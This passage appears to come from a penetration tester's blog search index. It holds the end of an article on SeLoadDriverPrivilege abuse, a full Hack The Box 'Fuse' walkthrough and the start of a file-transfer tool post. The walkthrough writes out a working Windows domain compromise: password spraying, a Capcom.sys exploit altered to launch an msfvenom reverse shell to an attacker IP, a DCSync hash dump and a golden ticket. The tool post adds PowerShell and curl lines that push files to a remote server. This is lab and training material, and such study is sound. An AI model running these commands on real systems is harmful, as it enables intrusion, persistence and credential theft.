\u0026amp;ProcessInfo)) { return false; } CloseHandle(ProcessInfo.hThread); CloseHandle(ProcessInfo.hProcess); return true; } Compile it:\nGenerating our reverse-shell payload using msfvenom: Generate a simple reverse shell using msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[AttackIP] LPORT=[AttackPort] -f exe -o shell.exe Run the exploit chain on the victim: Now that we have all our tools ready, let\u0026rsquo;s execute the attack:\nI Use evil-winrm to transfer all the files to the target:\nupload [filename] Use whatever method you prefer Load the driver Run Exploit:\n.\\EopLoadDriver.exe System\\CurrentControlSet\\Capcom C:\\Users\\svc-print\\Documents\\Capcom.sys All 0\u0026rsquo;s is good as a response, means we are working. Setup Listener:\nrlwrap -cAr nc -lnvp 443 Trigger exploit:\n.\\ExploitCapcom.exe Catch the reverse shell and verify privileges:\nSummary: This real-world example demonstrates the entire process of exploiting the SeLoadDriverPrivilege, from initial enumeration to achieving SYSTEM-level access.\nDefending Against SeLoadDriverPrivilege Attacks: Given the potential for abuse, it\u0026rsquo;s crucial for system administrators to take steps to mitigate the risks associated with SeLoadDriverPrivilege. This includes:\nRestricting privilege assignment to only the most trusted accounts. Implementing rigorous driver integrity checks. Regularly auditing account privileges to detect any unauthorized changes. Using driver blocklists to prevent known vulnerable drivers from being loaded. Employing application control solutions like Windows Defender Application Control (WDAC) or AppLocker to restrict driver loading. Detection is equally important. Monitoring Windows Event Logs for driver loading events (Event ID 6), configuring Sysmon to track driver loads, and implementing behavioral analysis to spot unusual patterns of driver loading can all help in identifying potential attacks.\nIt\u0026rsquo;s important to note that no single measure can provide complete protection against SeLoadDriverPrivilege exploitation. A defense-in-depth strategy, combining multiple layers of security controls, is crucial for comprehensive protection against this and other potential vulnerabilities.\nConclusion: SeLoadDriverPrivilege serves as a stark reminder of the complexities involved in securing modern operating systems. What appears to be a benign administrative privilege can, in the wrong hands, become a powerful tool for system compromise. Mitigating such vulnerabilities will remain crucial in our ongoing efforts to protect our systems and data.\nFurther Reading: For those interested in diving deeper into this topic, I recommend exploring:\nMicrosoft documentation on User Rights Assignment Windows Internals, Part 1 by Pavel Yosifovich MITRE ATT\u0026amp;CK framework , particularly the entry on T1543.003 - Create or Modify System Process (Windows Service). Frequently Asked Questions: Q: Is SeLoadDriverPrivilege a vulnerability in Windows?\nA: SeLoadDriverPrivilege itself is not a vulnerability, but rather a legitimate Windows privilege that can be misused. The vulnerability lies in improper assignment or management of this privilege. Q: Can SeLoadDriverPrivilege be completely disabled?\nA: While it\u0026rsquo;s not recommended to completely disable this privilege as it\u0026rsquo;s used by legitimate Windows processes, it\u0026rsquo;s crucial to strictly limit which accounts have this privilege assigned. Q: How can I check if my account has SeLoadDriverPrivilege?\nA: You can use the Windows \u0026ldquo;Local Security Policy\u0026rdquo; editor (secpol.msc) and navigate to \u0026ldquo;Security Settings\u0026rdquo; \u0026gt; \u0026ldquo;Local Policies\u0026rdquo; \u0026gt; \u0026ldquo;User Rights Assignment\u0026rdquo; to see which accounts have this privilege assigned. Q: Are there any legitimate uses for SeLoadDriverPrivilege?\nA: Yes, this privilege is used by system processes and certain applications that need to load drivers. For example, some antivirus software and system management tools require this privilege. Q: How difficult is it to exploit SeLoadDriverPrivilege?\nA: While the basic concept is straightforward, successfully exploiting this privilege requires a good understanding of Windows internals and kernel-mode programming. However, ready-made exploit tools do exist, lowering the barrier for less skilled attackers. Appendix: Sources used: https://attack.mitre.org/techniques/T1543/003/ https://www.amazon.co.uk/dp/0735684189?psc=1\u0026smid=A3P5ROKL5A1OLE\u0026ref_=chk_typ_imgToDp https://github.com/TarlogicSecurity/EoPLoadDriver/ https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/ https://redcanary.com/blog/threat-detection/ms-driver-block-rules/ https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/ https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt ", 
        "url": "http:\/\/localhost:1313\/articles\/seloaddriverprivilegeescalation\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/fuse-box\/": {
        "title": "Fuse HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","Active Directory","LDAP","SeLoadDriverPrivilege","RPC","Capcom",],
        "content": "Fuse Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Fuse How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Fuse/scans/nmap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 13:44:19 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 13:44 BST Nmap scan report for 10.129.2.5 Host is up (0.039s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds Initial thoughts: DNS, Web, Kerberos, LDAP, SMB are all great targets. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Fuse/scans/nmap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 11s 🕙 13:44:41 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 13:46 BST Nmap scan report for 10.129.2.5 Host is up (0.039s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html). 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-16 13:01:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49676/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49755/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2016 (89%) OS CPE: cpe:/o:microsoft:windows_server_2016 Aggressive OS guesses: Microsoft Windows Server 2016 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-time: | date: 2024-10-16T13:02:27 |_ start_date: 2024-10-16T12:39:39 | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Fuse | NetBIOS computer name: FUSE\\x00 | Domain name: fabricorp.local | Forest name: fabricorp.local | FQDN: Fuse.fabricorp.local |_ System time: 2024-10-16T06:02:28-07:00 |_clock-skew: mean: 2h33m00s, deviation: 4h02m31s, median: 12m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 237.63 seconds RPC is also present \u0026amp; we can extract alot of information using RPC. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker python3 ldapchecker.py $box It turns out the anonymous bind is not enabled but we can still get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 13:44:45 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.2.5 with SSL... Failed to connect with SSL. Retrying without SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=fabricorp,DC=local CN=Configuration,DC=fabricorp,DC=local CN=Schema,CN=Configuration,DC=fabricorp,DC=local DC=DomainDnsZones,DC=fabricorp,DC=local DC=ForestDnsZones,DC=fabricorp,DC=local We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=FUSE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fabricorp,DC=local It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt I get 3 valid users \u0026amp; add them to my users list. RPC: I connect using a null session, however we are unable to enumerate: rpcclient -U '%' $box SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Guest account is disabled \u0026amp; the null session cannot enumerate the shares. Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] HTTP 80: It appears to be a print logger: Discovering Usernames in the CSV Entries: There are CSV files that can downloaded: Looking at them I can see that there are users we did not find using kerbrute: Discovering their may be an issue with the printing service in the CSV entries: We can see that there is a printing issue: This may not seem like much, but if they are facing issues it may let us know their is a wider issue. Directory Busting With FFUF: I Perform some directory busting to see if there are any interesting directories: ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://fuse.fabricorp.local/papercut/FUZZ -fc 403 -ic Fuzzing for more CSV\u0026rsquo;s with FFUF: As the download string for the csv is in the below format we can fuzz it using FFUF /papercut/logs/csv/monthly/papercut-print-log-2020-05.csv I fuzz it using custom wordlist. ffuf -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:MONTH -w ~/Wordlists/45.06-CustomWordlists/numbersYears-1990-2049.txt:YEAR -u http://fuse.fabricorp.local//papercut/logs/csv/monthly/papercut-print-log-YEAR-MONTH.csv -fc 403 -ic Just the same two entries we have already found. Finding a password in the Printer Logs: Looking back through the print logs I see the string Fabricorp01.docx, if we remove the .docx it looks alot like a password:\nI use netexec to password spray:\nnetexec smb $box -u Users.txt -p 'Fabricorp01' --shares The response: STATUS_PASSWORD_MUST_CHANGE means that the password is correct but has to be changed on the next login! Changing the expired password: Attempt 1: Trying to change the expired password using smbpasswd.py: I try and change the users passwords using smbpasswd.py by impacket: sudo python3 smbpasswd.py $domain\\$user:$pass@$box -newpass 'N3wPass1$$09%12828' It does not work. Lets see if we can find another way to change this password online. +Note+: Only reason I used sudo was incase there was anything strange happening where I needed to. Attempt 2: Trying to change the password using powershell: After some searching online, I find [[https://hinchley.net/articles/changing-your-expired-active-directory-password-via-powershell ][this article]] which details the change via powershell. It\u0026rsquo;s worth a shot:\nI fire up my windows vm \u0026amp; connect to the VPN:\nI Modify my hosts file \u0026amp; then modify the script on the page but still cannot change the password.\nLets see if we can do it via impacket again but with different arguments.\nAttempt 3: Finally changing a password with smbpasswd.py: python3 smbpasswd.py $user:$pass@$box -newpass 'N3wPassWILLTHISWORK1$$09%'\n+Note+:\nI think the main issue\u0026rsquo;s why this did not work before are due to the initial password I tried not being complex enough, 'N3Pass1' \u0026amp; for some reason it doesn\u0026rsquo;t like when we use the domain name. I can list shares in netexec:\nHowever after I try and access the shares again for further enumeration, it appears as if the password has been changed:\nI check the older password 'Fabricorp01' and it seems to have reverted to that:\nThis looks like it\u0026rsquo;s reverting to the previous password after a certain amount of time. Preparing commands to access SMB: As it appears we have a time limit before the password is reset we need to prepare all of our commands to ensure we access the resources.\nBasic envs \u0026amp; password change:\nuser=tlavel oldPass=Fabricorp01 newPass=\u0026#39;BrandNewPassword69!1811\u0026#39; python3 smbpasswd.py $user:$oldPass@$box -newpass $newPass Tools:\nnetexec smb $box -u $user -p $newPass --shares smbmap -u $user -p $newPass -H $box -r 3 I check all users who\u0026rsquo;s passwords can be changed. It\u0026rsquo;s easy using the above approach as all we have to do is modify the user env. tlavel bhult bnielson It appears that all users have access to the same shares \u0026amp; the most interesting one is the print$ share. +Note+: This is why I like using envs they make time sensitive tasks like this ALOT quicker \u0026amp; smoother. Downloading the entire print$ share: I download everything using smbget: smbget -U $domain/$user --recursive \u0026quot;smb://$box/print$\u0026quot; +Note+: bnielson was the last user I was logged in as that\u0026rsquo;s why I am doing this as them. BrandNewPassword69!181128!!!!!\nsmbget -U $domain/$user --recursive \u0026quot;smb://$box/sysvol\u0026quot; Searching for more information in the pillaged smb files: I look through the files but there is nothing interesting I can see/find. Trying to dump user information via ldapsearch: As we can access the host using credentials temporarily I try and dump all user information using ldap: ldapsearch -H ldap://fuse.$domain-x -b \u0026quot;DC=fuse,DC=fabricorp\u0026quot; -D \u0026quot;cn=$user,dc=fuse,dc=fabricorp\u0026quot; -w $newPass-s sub \u0026quot;(\u0026amp;(objectclass=user))\u0026quot; \u0026gt;\u0026gt; ldapUsersAll.txt However it just errors out: Enumerating using rpcclient: I change the password again and manage to get an rpc session:\nrpcclient -U $user $box I dump all the users on the domain:\nenumdomusers This is good as it gives us more users now. I query each user individually to see if there is any important information in their descriptions, but find nothing:\nqueryuser [RID] Finding a hard-coded clear text credential a printer description: I enumerate the printers using rpclient and find a hardcoded password in the description field:\nenumprinters I cred stuff using newly found credentials \u0026amp; users:\nnetexec smb $box -u Users.txt -p $pass --continue-on-success | grep [+] I get two hits: svc-print svc-scan I have a deep dive on rpc available here:\nhttps://bloodstiller.com/cheatsheets/rpc-cheatsheet/ 2. Foothold: Enumerating as svc-print: Running a bloodhound collection: Now that we have creds that arent\u0026rsquo; changing all the time we can to a full bloodhound collection: python3 bloodhound.py -dc fuse.$domain -c All -u $user -p $pass -d $domain -ns $box Connecting to the host using evil-winrm: I connect to the host using evil-winrm:\nevil-winrm -i $box -u $user -p $pass I get the user flag:\n3. Privilege Escalation: I have written a deep dive that goes into this exploitation method in more detail: https://bloodstiller.com/articles/seloaddriverprivilegeescalation/ Finding out we have the SeLoadDriverPrivilege privilege: I enumerate the privileges of my user: whoami /priv Checking my group memberships confirms this also: From previous experience I know this is a viable privilege escalation path using the Capcom.sys exploit. Checking the system is vulnerable to the exploit: The Capcom.sys attack only works if the Windows build is below build 17134.\nBut how do I know this? I will share how I know this information soon. I check the build:\n[System.Environment]::OSVersion.Version It\u0026rsquo;s 14393 so we can move forward with this attack. Print Operators Group Explained: Allowed local logon to DCs; can exploit Windows to load malicious drivers.\nBeing part of the Print Operators Group grants users the SeLoadDriverPrivilege\nPrint Operators Group Overview:\nPurpose: Provides management capabilities for printers connected to domain controllers and Active Directory printer objects within the domain. Capabilities:\nManage, create, share, and delete printers. Manage Active Directory printer objects. Locally sign in to and shut down domain controllers. Caution and Restrictions:\nMember Caution: Due to the ability to load and unload device drivers on domain controllers, add members cautiously. Restrictions: Cannot be renamed, deleted, or removed. No default members. Attributes and Permissions:\nWell-known SID/RID: S-1-5-32-550 Type: Builtin Local Default Container: CN=Builtin, DC=[domain], DC=[domain] Protected by AdminSDHolder?: Yes Movement Restrictions: Cannot be moved out of the default container. Delegation: Not safe to delegate management to non-service admins. +Default+ User Rights. Allow log on locally: SeInteractiveLogonRight Load and unload device drivers: SeLoadDriverPrivilege This is what we are mainly interested in as we can load a malicious driver. Shut down the system: SeShutdownPrivilege SeLoadDriverPrivilege Explained: Permits the dynamic loading and unloading of device drivers, which can be essential for system updates or configuration changes. Being part of the Print Operators Group provides this privilege by default. There is a great article here about how it can be abused. We can take advantage of this privilege to exploit a well known vulnerable driver called Capcom.sys to run code as SYSTEM. 4. Ownership: Capcom.sys Driver Vulnerability: Arbitrary Code Execution with SYSTEM Privileges TL;DR: Key Takeaways Capcom.sys is a vulnerable driver that allows attackers to execute arbitrary code with SYSTEM privileges. Protections like VBS and HVCI can help mitigate risks, but require modern hardware. Driver block rules: can provide an additional layer of defense by preventing vulnerable drivers from loading. Overview of the Capcom.sys Vulnerability: The Capcom.sys kernel driver is notorious for its functionality that permits the execution of arbitrary code in kernel mode directly from user space.\nSpecifically, this driver disables SMEP (Supervisor Mode Execution Prevention) before invoking a function provided by the attacker, enabling us to run code with SYSTEM privileges.\nYou can find the real Capcom.sys driver on GitHub: Capcom.sys driver on GitHub Affected Windows Versions:\nThis exploit has been tested and verified on the following Windows versions: Windows 7 (x64) Windows 8.1 (x64) Windows 10 (x64) up to build 17134 (Version 1708) Windows 11 (x64) up to build 22000.194 (Version 21H2) Builds after 22000.194 contain deny lists that prevent this driver from loading. Security Considerations: Modern versions of Windows have introduced protections like Virtualization-based Security (VBS) and Hypervisor-Protected Code Integrity (HVCI) to mitigate the risks posed by vulnerable drivers such as Capcom.sys.\nThese security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it’s important to note that these features often require newer hardware and can have a performance impact.\nFor a deeper dive into the issue of signed vulnerable drivers, you can refer to:\nWeLiveSecurity\u0026rsquo;s article Mitigation Strategies:\nTo safeguard against vulnerabilities like this, Microsoft recommends implementing driver block rules as part of a comprehensive security policy. These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load. For more on how to implement and enforce these rules, check out:\nRed Canary’s guide on driver block rules Download A Copy of the official Capcom.sys Driver: Download the official driver: wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys We will keep it locally at the moment as there are some other tools we need to compile before we can move forward. Compiling the EopLoadDriver tool to enable us to load the Capcom.sys driver: The EopLoadDriver tool is a utility designed to leverage the SeLoadDriverPrivilege for loading a driver into the Windows kernel. It interacts with the Windows registry to register the driver and then uses the NtLoadDriver system call to load it. This tool is essential in our exploit chain as it allows us to load the vulnerable Capcom.sys driver, which we\u0026rsquo;ll subsequently exploit to gain SYSTEM privileges. By using EopLoadDriver, we\u0026rsquo;re able to bridge the gap between having the SeLoadDriverPrivilege and actually loading a driver of our choice into the kernel.\nPreparing the EopLoadDriver ~C++ Project: This is a C++ file that will need to be compiled within Visual Studio so I will spin up my Windows VM\nI download the project: https://github.com/TarlogicSecurity/EoPLoadDriver/ I create a new project: Then type Console into the search bar \u0026amp; select ConsolApp with C++ written below it. Click Next I give it a name \u0026amp; also select: Place solution and project in the same directory:\nHit \u0026quot;Create\u0026quot; +Note+: Just incase you are unaware, this just puts source code \u0026amp; project itself in the same directory is all. This provides a standard Hello World template, which we can use as the basis of our project:\nImporting the EopLoadDriver code \u0026amp; Compiling: I delete all the code on the Hello World generated file \u0026amp; paste in the contents of Targlogic\u0026rsquo;s EopLoadDriver code:\nhttps://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp I set it to release \u0026amp; then press build but get errors relating to stdafx.h:\nI do some searching online \u0026amp; find this:\nSo my imports look like this now:\nI re-run the build and it builds successfully:\nCompiling the ExploitCapcom exploit C++ project: We are going to be using the ExploitCapcom tool. We will need to compile this ourselves. The ExploitCapcom tool is the core component of our privilege escalation attack. It\u0026rsquo;s designed to exploit the vulnerability in the Capcom.sys driver that we\u0026rsquo;ve loaded using EopLoadDriver. This tool takes advantage of the driver\u0026rsquo;s ability to disable Supervisor Mode Execution Prevention (SMEP) and execute arbitrary code in kernel mode. By default, ExploitCapcom opens a new command prompt with SYSTEM privileges, but we\u0026rsquo;ll modify it to launch our custom payload instead. This tool effectively completes the privilege escalation chain, leveraging the loaded vulnerable driver to elevate our permissions to the highest level in the Windows operating system.\nImporting the ExploitCapcom C++ Project: This time I am going to clone this repo:\nPaste in the repo url:\nhttps://github.com/tandasat/ExploitCapcom.git Modifying ExploitCapcom exploit to enable a reverse shell: I open ExploitCapcom.cpp and do not remove the stdafx.h import:\nThe reason being is the actual required file containing the header is in this project. So we can compile with it. This exploit by default opens a new elevated shell, however this requires we have GUI access. So we will need to modify to run a reverse shell:\nBelow is the code we are going to modify:\nTCHAR CommandLine[] = TEXT(\u0026quot;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026quot;); I will modify it to run a reverse shell generated via msfvenom:\n// Launches a command shell process static bool LaunchShell() { //Original Line Commented Out: //TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026#34;); TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Users\\\\svc-print\\\\Documents\\\\shell.exe\u0026#34;); PROCESS_INFORMATION ProcessInfo; STARTUPINFO StartupInfo = { sizeof(StartupInfo) }; if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, \u0026amp;StartupInfo, \u0026amp;ProcessInfo)) { return false; } CloseHandle(ProcessInfo.hThread); CloseHandle(ProcessInfo.hProcess); return true; } Full transparency, I tried multiple different payloads. My original plan was to upload nc64.exe but it just would not execute not matter the subshells etc I used. I compile it:\nGenerating our reverse-shell payload using msfvenom: I generate a simple reverse shell using msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=443 -f exe -o shell.exe Run the exploit chain on the victim: I use evil-winrm to transfer all the files to the target:\nupload [filename] Load the driver Run Exploit:\n.\\EopLoadDriver.exe System\\CurrentControlSet\\Capcom C:\\Users\\svc-print\\Documents\\Capcom.sys All 0\u0026rsquo;s is good as a response, means we are working. Setup Listener:\nrlwrap -cAr nc -lnvp 443 Trigger exploit:\n.\\ExploitCapcom.exe Catch the reverse shell:\nGet our root flag:\n5. Persistence: Creating a Golden Ticket with mimikatz: I transfer mimikatz.exe over using my existing evil-winrm session:\nI perform a DCsync attack to retrieve the krbtgt NTLM hash:\nlsadump::dcsync /user:krbtgt /domain:fabricorp.local I also retrieve the domain SID I create my golden ticket using mimikatz \u0026amp; the krbtgt hash to make myself a 10 year ticket:\nkerberos::golden /domain:fabricorp.local /user:Administrator /sid:S-1-5-21-2633719317-1471316042-3957863514 /rc4:8ee7[REDACTED]87b0 I transfer the ticket back myself using evil-winrm:\nI convert the ticket so I can use it locally on linux:\nimpacket-ticketConverter ticket.kirbi admin.ccache I sync my clock with the target:\nsudo ntpdate -s fuse.$domain I load the ticket into the KRB5CCNAME variable:\nexport KRB5CCNAME=./admin.ccache I verify it works using a psexec session:\nimpacket-psexec fuse.$domain -k Full DCSync attack using netexec and Golden Ticket: Now that we have our Golden ticket we can use it to perform a DCSync attack and extract all the hashes: netexec smb $box --use-kcache -M ntdsutil Lessons Learned: What did I learn? I learned that trying to get all your enumeration done very quickly before the password is reset can be frustrating.\nI learned that people will always use the description field to hold important information.\nI learned that the exploit really did not want to execute the nc64.exe binary no matter how hard I tried. However I think I may have a record for speed-running compiling exploits.\nWhat silly mistakes did I make? Had to revert the machine and forgot the hosts. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/fuse-box\/"
    },
    
    "http:\/\/localhost:1313\/tools\/bloodserver\/": {
        "title": "BloodServer: A Secure File Transfer Tool for Penetration Testers",
        "tags": ["Active Directory","Windows","Server","Python","Tools",],
        "content": "BloodServer: A Secure File Transfer Tool for Penetration Testers As a penetration tester, securely transferring files during engagements is crucial. That\u0026rsquo;s why I developed BloodServer, a lightweight Python-based server designed specifically for pentesters who need a quick and secure way to transfer files in controlled environments.\nFeel free to contribute to the project or report issues on my GitHub repository .\nKey Features Easy Setup: BloodServer can be quickly deployed with minimal configuration. Authentication: Basic authentication is built-in to prevent unauthorized access. HTTPS Support: Optional HTTPS encryption for secure data transfer. File Upload Capability: Allows for easy file uploads via POST requests. Configurable Options: Customize port, username, and password via command-line arguments. Graceful Shutdown: Stop the server cleanly with a simple keyboard command. Logging: Server activities are logged for monitoring and debugging. Requirements and Installation BloodServer is lightweight and requires only Python 3.6+ and OpenSSL (for HTTPS support). Installation is as simple as cloning the repository:\ngit clone https://github.com/bloodstiller/bloodserver.git cd bloodserver No additional dependencies are needed as BloodServer uses Python standard library modules.\nUsage Example To start the server with default settings:\npython bloodserver.py For HTTPS and custom port:\npython bloodserver.py -p 8443 --https You can also specify a custom username and password:\npython bloodserver.py -u bloodstiller --password bl00dst1ll3r --https Client-Side File Upload BloodServer supports file uploads via POST requests. Here are examples for both Windows (PowerShell) and Linux systems:\nPowerShell (Windows) For HTTP:\n$wc = New-Object System.Net.WebClient; $wc.Headers.Add(\u0026#34;Authorization\u0026#34;, \u0026#34;Basic \u0026#34; + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(\u0026#34;username:password\u0026#34;))); try { $response = $wc.UploadData(\u0026#34;http://serverip:port\u0026#34;, [System.IO.File]::ReadAllBytes(\u0026#34;path\\to\\file\u0026#34;)); Write-Host \u0026#34;Server response: $([System.Text.Encoding]::UTF8.GetString($response))\u0026#34;; Write-Host \u0026#34;File sent successfully!\u0026#34; } catch { Write-Host \u0026#34;An error occurred: $_\u0026#34; } For HTTPS (ignoring SSL certificate errors):\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.WebClient; $wc.Headers.Add(\u0026#34;Authorization\u0026#34;, \u0026#34;Basic \u0026#34; + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(\u0026#34;username:password\u0026#34;))); try { $response = $wc.UploadData(\u0026#34;https://serverip:port\u0026#34;, [System.IO.File]::ReadAllBytes(\u0026#34;path\\to\\file\u0026#34;)); Write-Host \u0026#34;Server response: $([System.Text.Encoding]::UTF8.GetString($response))\u0026#34;; Write-Host \u0026#34;File sent successfully!\u0026#34; } catch { Write-Host \u0026#34;An error occurred: $_\u0026#34; } Linux For HTTP:\ncurl -X POST -u username:password -F \u0026#34;file=@/path/to/your/file\u0026#34; http://serverip:port For HTTPS (ignoring SSL certificate errors):\ncurl -X POST -u username:password -F \u0026#34;file=@/path/to/your/file\u0026#34; -k https://serverip:port Replace username, password, /path/to/your/file, serverip, and port with your specific values.\nCode: I have placed the code here for convenience.\nimport http.server import socketserver import os import logging import ssl import base64 import argparse from urllib.parse 